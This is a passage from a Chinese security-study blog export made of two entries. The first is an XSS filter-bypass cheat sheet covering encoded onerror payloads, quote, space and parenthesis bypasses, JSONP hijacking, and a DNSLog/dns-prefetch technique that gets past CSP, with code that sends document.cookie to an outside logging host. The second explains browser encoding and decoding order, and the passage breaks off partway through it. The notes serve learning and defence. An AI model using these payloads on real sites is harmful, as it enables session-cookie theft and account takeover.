<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>url编码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Ascii码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>hex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>八进制</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>base64</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>内嵌编码后TAB</strong></p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x09;</span>ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>多重尖括号</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>使用一些字符绕过”.js”过滤</strong></li>
</ul>
<p>将JS文件重命名为图像</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>


<h3 id="过滤空格-引号"><a href="#过滤空格-引号" class="headerlink" title="过滤空格/引号"></a>过滤空格/引号</h3><ul>
<li><strong>使用<code>/</code>代替</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/);</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="过滤单-双引号"><a href="#过滤单-双引号" class="headerlink" title="过滤单/双引号"></a>过滤单/双引号</h3><ul>
<li><strong>使用反引号代替</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>编码绕过</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><ul>
<li><strong>使用 throw 绕过</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1337</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>onerror</code>在每次javascript执行异常时都会被激活，调用指定的处理程序，并且<code>throw</code>语句可创建一个发送到<code>onerror</code>处的包含表达式的自定义异常。因为<code>throw</code>是一个语句，在和<code>onerror</code>配合使用时需要用分号隔离，避免被包含。</p>
<ul>
<li><strong>使用``` `代替</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>HTML编码绕过</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>




<h3 id="过滤URL地址"><a href="#过滤URL地址" class="headerlink" title="过滤URL地址"></a>过滤URL地址</h3><ul>
<li><strong>使用URL编码</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>使用IP</strong></li>
</ul>
<p>使用进制转换</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>html标签中用<code>//</code>可以代替<code>http://</code></strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>使用<code>\\</code></strong></li>
</ul>
<p>但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`\\<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>使用中文句号代替英文点号</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>利用data类型的url代替<code>http://</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text,alert()</span><br></pre></td></tr></table></figure>




<h2 id="XSS高级利用方式"><a href="#XSS高级利用方式" class="headerlink" title="XSS高级利用方式"></a>XSS高级利用方式</h2><h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>script标签是可以加载异域的JavaScript并执行的，通过预先设定好的callback函数来实现和非同源页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。</p>
<p>a网站的前端代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params">jsondata</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//处理获得的json数据</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://haorooms.com/data.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>b网站的后台代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.json_encode(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>典型的JSON劫持就是通过定义一个跟JSON接口中callback参数值相同的函数来接收JSON接口的数据，它其实就是JSON接口数据加载成功后的callback函数。JSON劫持的产生原因，重点还是在于对调用方没有做判断，或者说他的这种接口地址是固定的或者可猜测的。</p>
<p>example：</p>
<p>b网站的JSONP接口为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;haorooms.com&#x2F;data.php?callback&#x3D;dosomething</span><br></pre></td></tr></table></figure>
<p>在上面的JSONP接口中，dosomething是可以修改的，我们改为<code>&lt;img src=0 onerror=alert(0)&gt;</code>，b网站后端没有对传入的参数进行检查过滤，那么会返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;0 onerror&#x3D;alert(0)&gt;&#x2F;&#x2F;[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</span><br></pre></td></tr></table></figure>
<p>一旦如果开发不严谨，没有对Content-Type进行设置或者为text/html或者application/json，可以将内容解析为html的就可能导致XSS的产生。</p>
<h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p>对于没有回显的XSS，我们要想知道是否成功也可以利用<code>src</code>属性填入得到的域名。</p>
<p>example：</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?input&#x3D;&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.t6n089.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317151942334.png" alt="image-20210317151942334"></p>
<h4 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h4><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。</p>
<p>DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。有趣的是，DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。<br>由于DNS预解析可以绕过CSP进行解析，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。</p>
<p>example:</p>
<p>网站的源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;test&quot;,&quot;test&quot;,time()+3600);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DNSLog_XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">$myfile &#x3D; fopen(&quot;.&#x2F;set_cookie.js&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($myfile, $xss);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;set_cookie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>这里网站通过<code>&lt;meta&gt;</code>标签设置了CSP为只能加载当前域名的脚本，也就是说无法使用内联的脚本，攻击者需要找到能够注入XSS的JavaScript脚本的外联文件，这里我们可以看到后端把我们输入的值写入了<code>set_cookie.js</code>文件中，然后又通过外联脚本引入了这个文件，这样我们就可以通过这里来进行XSS攻击。</p>
<p>在没有CSP情况下，我们通常是通过<code>&lt;img&gt;</code>等有src属性的标签带上cookie作为参数去访问我们的服务器：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src = <span class="string">&quot;http://t6n089.ceye.io/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
<p>由于这里有CSP限制了不能读取外部的资源，因此这里会报错。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163246373.png" alt="image-20210318163246373"></p>
<p>这里我们就可以使用DNS预解析去进行绕过：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML&#x3D;&quot;&lt;link rel&#x3D;&#39;dns-prefetch&#39; href&#x3D;&#39;http:&#x2F;&#x2F;&quot;+document.cookie.split(&#x2F;;|&#x3D;&#x2F;)[0].trim()+&quot;.t6n089.ceye.io&#39;&gt;&quot;;</span><br></pre></td></tr></table></figure>
<p>URL编码后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML%3D%22%3Clink%20rel%3D&#39;dns-prefetch&#39;%20href%3D&#39;http%3A%2F%2F%22%2Bdocument.cookie.split(%2F%3B%7C%3D%2F)%5B0%5D.trim()%2B%22.t6n089.ceye.io&#39;%3E%22%3B</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
<p>这种利用方法十分苛刻，因为不仅要找到能够修改后台的外联JavaScript文件的方法，而且作为XSS攻击，此payload过长，容易被怀疑，而使用短链接加载外部脚本有会被CSP禁止，再加上根据DNS的规定，域名的长度是有限制的，有时可能不发将长cookie完全带出。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.fooying.com/the-art-of-xss-1-introduction/#" >跨站的艺术-XSS入门与介绍<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.sqlsec.com/2020/01/xss.html" >XSS从零开始<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://websec.readthedocs.io/zh/latest/index.html" > Web安全学习笔记<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/u010648555/article/details/108351169" >XSS(跨站脚本攻击)相关内容总结整理<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/4067#toc-4" >XSS总结<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS编码剖析</title>
    <url>/2021/03/13/XSS%E7%BC%96%E7%A0%81%E5%89%96%E6%9E%90/</url>
    <content><![CDATA[<h2 id="XSS编码剖析"><a href="#XSS编码剖析" class="headerlink" title="XSS编码剖析"></a>XSS编码剖析</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在不了解HTML、JavaScript在网页中编码解码的原理之前，我就有一个疑惑，为什么有时候一些关键字被过滤掉了之后可以使用编码进行绕过，编码之后的内容仍然可以在页面中解析出来；可是反过来后端防御攻击的手段又是将输入的内容进行编码转义，如PHP中的<code>htmlspecialchars()</code>函数，使得其中的内容变为一般的字符输出，而不会在页面中解析出来。这两者有关联吗，其中的原因又是什么？</p>
<h2 id="浏览器响应过程"><a href="#浏览器响应过程" class="headerlink" title="浏览器响应过程"></a>浏览器响应过程</h2><p>来看看浏览器处理一次完整的HTTP请求，会涉及到的编码解码问题。</p>
<ol>
<li>当浏览器发送HTTP请求时，会先对特殊字符进行URL编码后，发送给服务器。</li>
<li>服务器收到客户端发送来的HTTP请求，会对其进行URL解码后，再进行处理，处理完成后将结果返回给浏览器。</li>
<li>浏览器接收到HTML文件后，最先是触发HTML解析器来解析HTML，将标签转化为内容树中的DOM节点，此时在识别标签的时候，HTML解析器是不能识别哪些被HTML实体编码了，只有当整个DOM树建立起来后，才能对每个节点的内容进行识别，如果有HTML实体编码，再对其进行解码。</li>
<li>在HTML解析器过程中，遇到JS标签诸如<code>&lt;script&gt;</code>会调用JS解释器对JS代码进行解析，而JS DOM API会对DOM结构进行更改，DOM树节点的更改也会反过来触发HTML解释器。</li>
<li>CSS解释器也会在HTML解释器过程中参与进来，但它不会干扰到DOM树，它会结合<code>&lt;style&gt;</code>标签和CSS文件以及HTML指令来构建render tree。</li>
</ol>
<h2 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>
<p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
<p>这里值得一提的是，URL编码作用并不在于绕过后台检测，但是当我们是以GET方式提交数据时，如果数据中存在<code>&amp;</code>、<code>#</code>、<code>+</code>这样的特殊字符，就需要进行URL编码，才能够保障正常解析，因为这些字符在URL中都有特殊的功能，不进行编码就会默认为是特殊的功能。</p>
<p>example：</p>
<p>服务器后端对<code>and</code>这个关键字进行了拦截，这时候我们想使用<code>&amp;&amp;</code>来代替，如果我们在URL中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 &amp;&amp; 1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>这时候后端收到的并不是<code>id=1 &amp;&amp; 1=2</code>，而是<code>id=1</code>和<code>1=2</code>，这是由于<code>&amp;</code>的存在导致后端认为我们输入的2个参数而不是一个，正确的输入为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 %26%26 1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>通过URL编码让后端认为我们输入的<code>&amp;</code>并不是想要输入多个参数，而是原来就是<code>&amp;</code>的字符，就好像是我们在字符串中想要输出<code>\</code>的时候，我们要使用<code>\\</code>进行转义一样。</p>
<h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p>
<p>但是在HTML中有些字符是和关键词冲突的，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是标签，怎么解决呢？</p>
<p>为了正确地显示预留字符，我们需要在HTML源代码中使用字符实体，比如我们常见的空格<code>&amp;nbsp;</code>，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>
<table>
<thead>
<tr>
<th>显示结果</th>
<th>描述</th>
<th>实体名称</th>
<th>实体编号</th>
</tr>
</thead>
<tbody><tr>
<td>&lt;</td>
<td>小于号</td>
<td><code>&amp;lt;</code></td>
<td><code>&amp;#60;</code></td>
</tr>
<tr>
<td>&gt;</td>
<td>大于号</td>
<td><code>&amp;gt;</code></td>
<td><code>&amp;#62;</code></td>
</tr>
</tbody></table>
<p><strong>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析</strong>。</p>
<p>所以在PHP中，使用<code>htmlspecialchars()</code>函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。因此，具体来说，我们对HTML标签的结构进行实体编码就会导致他在浏览器解析的时候无法认为这是一个标签，而是一个串，但是当标签建立之后，里面的内容是能够被HTML解析出来的。</p>
<p>example：</p>
<ul>
<li>这是无法被解析出来，因为编码破坏了标签本身的结构</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>&amp;#<span class="attr">x3d</span>;&quot;<span class="attr">http:</span>//<span class="attr">www.example.com</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">s</span>&amp;#<span class="attr">x72</span>;<span class="attr">c</span>=<span class="string">&quot;http://www.example.com&quot;</span>&gt;</span></span><br><span class="line">&lt;s<span class="symbol">&amp;#x63;</span>ript&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这是能够被解析出来，因为结构没有被破坏，里面的内容可以被解析</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;ht<span class="symbol">&amp;#x74;</span>p://www.example.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">aler&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="JavaScript解码（Unicode）"><a href="#JavaScript解码（Unicode）" class="headerlink" title="JavaScript解码（Unicode）"></a>JavaScript解码（Unicode）</h3><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而<code>src</code>、 <code>href </code>后边加入的JavaScript伪URL，也会进入JS 的解析模式。而进入该解析模式的时候，该DOM节点已经建立起来了，但是HTML解释器还并未进行HTML解码。当触发JS解释器后，JS会先对内容进行解析，如果有JS编码就会进行解码操作，接下来是就是执行里面的JS语句。所以此时执行该JS语言前的解码顺序为JS解码–&gt;HTML解码。</p>
<p>在一个页面中，可以出发JS 解析器的方式有这么几种：</p>
<ul>
<li>直接嵌入<code>&lt;script&gt;</code> 代码块。</li>
<li>通过<code>&lt;script src=… &gt;</code> 加载代码。</li>
<li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li>
<li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li>
<li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li>
<li>定时器，Timer(setTimeout, setInterval)</li>
<li>eval(…) 调用。</li>
</ul>
<p>example：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;\u4e00&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>herf</code>的URL经过URL解码之后发现，使用了JavaScript伪协议，所以JS会对内容进行解析，里边有一个转义字符<code>\u4e00</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为<code>一</code>，于是在完成JS的解析之后变成了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>仍以上一段代码为例，假如我们编码的位置不是括号里，而是在alert上，JS是会对它进行解码的：</p>
